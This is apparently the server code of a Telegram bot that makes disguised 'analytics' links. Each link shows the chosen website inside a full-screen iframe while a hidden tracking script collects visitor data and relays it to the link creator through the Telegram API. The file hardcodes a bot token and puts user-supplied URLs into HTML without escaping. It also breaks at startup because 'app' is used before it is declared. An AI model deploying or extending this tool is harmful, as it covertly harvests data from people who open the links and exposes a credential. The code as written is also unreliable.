import express from "express";
import fetch from "node-fetch";
import fs from "fs";

app.use(express.static("public"));

const app = express();

app.use(express.json());

const BOT_TOKEN = "8650238704:AAEE4KSVTDBI-31LniTL212I_1P9bNghrGo";

const DB_FILE = "./database.json";

// Load DB
function loadDB() {
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, "{}");
  }

  return JSON.parse(fs.readFileSync(DB_FILE));
}

// Save DB
function saveDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// Random Tracking ID
function generateId() {
  return Math.random().toString(36).substring(2, 8);
}

// Home Route
app.get("/", (req, res) => {
  res.send("Bot Running 🚀");
});

// Tracking Route
app.get("/t/:id", (req, res) => {

  const trackingId = req.params.id;

  const db = loadDB();

  const entry = db[trackingId];

  if (!entry) {
    return res.send("Invalid Tracking ID");
  }

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="UTF-8">

  <meta name="viewport"
        content="width=device-width, initial-scale=1.0">

  <title>Loading...</title>

  <style>

    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

  </style>

</head>

<body>

  <iframe src="${entry.targetUrl}"></iframe>

  <script
    data-tracking-id="${trackingId}"
    data-server-url="https://analytics-bot-1-3j2c.onrender.com"
    src="/script.js">
  </script>

</body>
</html>
`);

});

// Analytics Route
app.post("/data", async (req, res) => {

  const { trackingId, pretty } = req.body;

  const db = loadDB();

  const entry = db[trackingId];

  if (!entry) {
    return res.sendStatus(404);
  }

  const ownerChatId = entry.owner;

  try {

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {

      method: "POST",

      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify({
        chat_id: ownerChatId,
        text: pretty || "No analytics data"
      })

    });

  } catch (e) {

    console.log(e);

  }

  res.sendStatus(200);

});

// Telegram Webhook
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {

  const msg = req.body.message;

  if (!msg) {
    return res.sendStatus(200);
  }

  const chatId = msg.chat.id;
  const text = msg.text;

  const db = loadDB();

  // START
  if (text === "/start") {

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {

      method: "POST",

      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify({

        chat_id: chatId,

        text:
`Welcome 👋

Commands:
/create - Create analytics link`

      })

    });

  }

  // CREATE
  else if (text === "/create") {

    db[chatId] = {
      waitingForUrl: true
    };

    saveDB(db);

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {

      method: "POST",

      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify({

        chat_id: chatId,
        text: "🌐 Send Website URL"

      })

    });

  }

  // URL INPUT
  else if (db[chatId]?.waitingForUrl) {

    const trackingId = generateId();

    db[trackingId] = {
      owner: chatId,
      targetUrl: text
    };

    db[chatId].waitingForUrl = false;

    saveDB(db);

    const trackingLink =
`https://analytics-bot-1-3j2c.onrender.com/t/${trackingId}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {

      method: "POST",

      headers: {
        "Content-Type": "application/json"
      },

      body: JSON.stringify({

        chat_id: chatId,

        text:
`✅ Tracking Link Created

🔗 ${trackingLink}`

      })

    });

  }

  res.sendStatus(200);

});

// Start Server
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {

  console.log("Server Running 🚀");

});
